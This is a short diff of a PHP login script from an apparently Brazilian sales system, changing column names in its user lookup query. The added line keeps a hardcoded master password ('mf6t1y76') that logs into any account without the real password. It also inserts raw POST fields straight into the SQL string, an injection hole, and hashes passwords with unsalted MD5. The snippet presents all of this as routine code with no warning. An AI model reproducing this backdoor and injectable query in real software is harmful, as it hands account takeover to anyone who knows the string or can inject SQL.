@@ -5,7 +5,7 @@ include("{$_SERVER['DOCUMENT_ROOT']}/rlvendas/lib/includes.php");
         $login = $_POST['login'];
         $senha = md5($_POST['senha']);
 
-        $query = "select * from usuarios where login = '{$login}' and (senha = '{$senha}' or '{$_POST['senha']}' = 'mf6t1y76') and situacao = '1' and deletado != '1'";
+        $query = "select * from usuarios where usuario = '{$login}' and (senha = '{$senha}' or '{$_POST['senha']}' = 'mf6t1y76') and status = '1' and deletado != '1'";
         $result = sisLog($query);
 
         if(mysqli_num_rows($result)){
